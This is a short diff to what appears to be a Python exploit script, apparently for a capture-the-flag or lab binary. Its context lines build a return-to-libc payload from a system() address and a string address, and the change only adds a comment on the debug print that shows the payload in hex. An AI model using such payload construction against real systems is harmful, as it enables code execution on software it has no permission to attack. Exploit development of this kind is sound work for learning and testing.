@@ -41,6 +41,8 @@ def exploit(binary_path):
         payload += p32(system_addr)
         payload += p32(0x0)
         payload += p32(string_addr)
+        
+        # Print the payload in hexadecimal representation for debugging purposes
         log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
 
         # Send the payload and print the output
